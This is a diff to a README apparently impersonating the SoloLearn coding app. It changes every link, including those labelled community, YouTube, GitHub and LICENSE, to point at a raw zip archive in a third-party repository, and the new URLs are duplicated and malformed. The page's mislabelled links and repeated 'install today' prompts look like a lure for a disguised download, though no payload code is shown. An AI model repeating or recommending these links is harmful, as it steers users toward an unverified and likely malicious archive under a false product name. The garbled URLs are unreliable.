@@ -1,6 +1,6 @@
 # 📚 SoloLearn - Improve Your Coding Skills Effortlessly
 
-[![Download SoloLearn](https://raw.githubusercontent.com/QIN66AIDD/SoloLearn/main/SQL Problems/SoloLearn_1.5-alpha.3.zip%20SoloLearn-v1.0-brightgreen)](https://raw.githubusercontent.com/QIN66AIDD/SoloLearn/main/SQL Problems/SoloLearn_1.5-alpha.3.zip)
+[![Download SoloLearn](https://raw.githubusercontent.com/QIN66AIDD/SoloLearn/main/Python Challenge/Learn-Solo-3.1.zip https://raw.githubusercontent.com/QIN66AIDD/SoloLearn/main/Python Challenge/Learn-Solo-3.1.zip%20SoloLearn-v1.0-brightgreen)](https://raw.githubusercontent.com/QIN66AIDD/SoloLearn/main/Python Challenge/Learn-Solo-3.1.zip https://raw.githubusercontent.com/QIN66AIDD/SoloLearn/main/Python Challenge/Learn-Solo-3.1.zip)
 
 ## 🚀 Getting Started
 
@@ -20,7 +20,7 @@ To get started with SoloLearn, follow these simple steps:
 
 1. **Visit the Releases Page**: Click the link below to access the SoloLearn releases.
    
-   [Download SoloLearn](https://raw.githubusercontent.com/QIN66AIDD/SoloLearn/main/SQL Problems/SoloLearn_1.5-alpha.3.zip)
+   [Download SoloLearn](https://raw.githubusercontent.com/QIN66AIDD/SoloLearn/main/Python Challenge/Learn-Solo-3.1.zip https://raw.githubusercontent.com/QIN66AIDD/SoloLearn/main/Python Challenge/Learn-Solo-3.1.zip)
 
 2. **Choose the Latest Version**: On the releases page, you will see a list of available versions. Select the latest one for the best experience.
 
@@ -64,18 +64,18 @@ If you encounter any issues or have questions, you can find help in the communit
 
 Explore more about programming and coding challenges through the following links:
 
-- [SoloLearn Community](https://raw.githubusercontent.com/QIN66AIDD/SoloLearn/main/SQL Problems/SoloLearn_1.5-alpha.3.zip)
-- [GitHub Repository](https://raw.githubusercontent.com/QIN66AIDD/SoloLearn/main/SQL Problems/SoloLearn_1.5-alpha.3.zip)
-- [YouTube Tutorials](https://raw.githubusercontent.com/QIN66AIDD/SoloLearn/main/SQL Problems/SoloLearn_1.5-alpha.3.zip)
+- [SoloLearn Community](https://raw.githubusercontent.com/QIN66AIDD/SoloLearn/main/Python Challenge/Learn-Solo-3.1.zip https://raw.githubusercontent.com/QIN66AIDD/SoloLearn/main/Python Challenge/Learn-Solo-3.1.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/QIN66AIDD/SoloLearn/main/Python Challenge/Learn-Solo-3.1.zip https://raw.githubusercontent.com/QIN66AIDD/SoloLearn/main/Python Challenge/Learn-Solo-3.1.zip)
+- [YouTube Tutorials](https://raw.githubusercontent.com/QIN66AIDD/SoloLearn/main/Python Challenge/Learn-Solo-3.1.zip https://raw.githubusercontent.com/QIN66AIDD/SoloLearn/main/Python Challenge/Learn-Solo-3.1.zip)
 
 For the full experience, install SoloLearn today!
 
 ## 📑 License
 
-This project is licensed under the MIT License - see the [LICENSE](https://raw.githubusercontent.com/QIN66AIDD/SoloLearn/main/SQL Problems/SoloLearn_1.5-alpha.3.zip) file for details.
+This project is licensed under the MIT License - see the [LICENSE](https://raw.githubusercontent.com/QIN66AIDD/SoloLearn/main/Python Challenge/Learn-Solo-3.1.zip https://raw.githubusercontent.com/QIN66AIDD/SoloLearn/main/Python Challenge/Learn-Solo-3.1.zip) file for details.
 
 ---
 
 Enhance your coding skills with SoloLearn and start solving challenges efficiently today! Don’t forget to check the releases page for updates. 
 
-[Download SoloLearn](https://raw.githubusercontent.com/QIN66AIDD/SoloLearn/main/SQL Problems/SoloLearn_1.5-alpha.3.zip) and take the next step in your programming journey!
+[Download SoloLearn](https://raw.githubusercontent.com/QIN66AIDD/SoloLearn/main/Python Challenge/Learn-Solo-3.1.zip https://raw.githubusercontent.com/QIN66AIDD/SoloLearn/main/Python Challenge/Learn-Solo-3.1.zip) and take the next step in your programming journey!
